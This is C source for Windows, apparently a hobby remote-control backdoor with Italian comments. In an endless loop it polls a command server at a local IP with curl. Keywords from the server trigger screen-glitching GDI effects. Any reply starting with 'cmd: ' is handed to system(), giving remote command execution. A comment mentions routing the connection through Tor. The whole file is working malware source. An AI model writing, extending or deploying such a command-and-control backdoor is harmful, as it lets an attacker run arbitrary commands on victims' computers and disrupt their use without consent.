#include <windows.h>
#include <math.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

/*
BitBlt usage:
BitBlt(hdcDest, TakeX, TakeY, TakeW, TakeH, hdcSrc, XSrc, YSrc, MODE)

Modes:
SRCCOPY - Copy
NOTSRCCOPY - Color invert
SRCINVERT - PXColor = PXColorDest + PXColoreSRC
BLACKNESS - black block
WHITENESS - white block
*/


//globalz
int w; // width
int h; // heigh

void heightglitch_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    int x = 0;

    x = rand() % w; // random lungo w
    BitBlt(hdc, x, 1, 10, h, hdc, x, 0, NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(100);
}

void widthglitch_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    int x = 0;

    x = rand() % 2; // random lungo h
    BitBlt(hdc, 10, x, w, h, hdc, 0, x, NOTSRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(100);
}

void tunnel_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);

    int newW = w - (1 * w / 100);
    int newH = h - (1 * h / 100);

    // trova il centro
    int x = (w - newW) / 2;
    int y = (h - newH) / 2;

    StretchBlt(hdc, x, y, newW, newH, hdc, 0, 0, w, h, SRCCOPY);
    ReleaseDC(NULL, hdc);
    Sleep(100);
}

void circleshake_run() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    static float angle = 0.0f;

    int dx = (int)(sin(angle) * 100);
    int dy = (int)(cos(angle) * 100);

    BitBlt(hdc, dx, dy, w, h, hdc, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hdc);

    angle = angle + 0.1f;
}

void startfx() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    heightglitch_run();
    widthglitch_run();
    tunnel_run();
    circleshake_run();
}

int main() {
    while(1) {
        printf("Clean\n");
        char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura. 

        if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
        
        if (fgets(reqtextbuffer, sizeof(reqtextbuffer), pointertotextstream) == NULL) { // meaning: fgets(buffer, size, stream), mette l'out di curl dentro il buffer
            pclose(pointertotextstream);
            printf("Sleeping for 20secs\n");
            sleep(20);
            continue; //quitta da questo if (quindi se continua ad essere NULL riparte e ritorna qui)
        } 

        pclose(pointertotextstream); // chiude il processo creato da popen (curl)
        printf("reqtextbuffer[]: %s\n", reqtextbuffer);

        if (strstr(reqtextbuffer, "PunchyStart")) { // xtreme, starta tutti gli fx a bestia
            int i;
            for(i=0;i<100;i++) {
                startfx();
            }
        }
        else if (strstr(reqtextbuffer, "HGlitch")) { // HGlitch
            int i;
            for(i=0;i<100;i++) {
                heightglitch_run();
            }
            
        }
        else if (strstr(reqtextbuffer, "WGlitch")) { // WGlitch
            int i;
            for(i=0;i<100;i++) {
                widthglitch_run();
            }
        }
        else if (strstr(reqtextbuffer, "TunnelRun")) { // TunnelRun
            int i;
            for(i=0;i<100;i++) {
                tunnel_run();
            }
        }
        else if (strstr(reqtextbuffer, "CircleShake")) { // CircleShake
            int i;
            for (i=0;i<100;i++) {
                circleshake_run();
            }
        }
        else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
            char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
            command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
            system(command); // esegui (RCE-Style)
            printf("Command Executed\n");
            printf("Sleeping for 20 secs");
            sleep(20);
        }
        else {sleep(20);}
    }
    return 0;
}

// connessiove a tor via curl (guarda il volantino di xebynginecli)
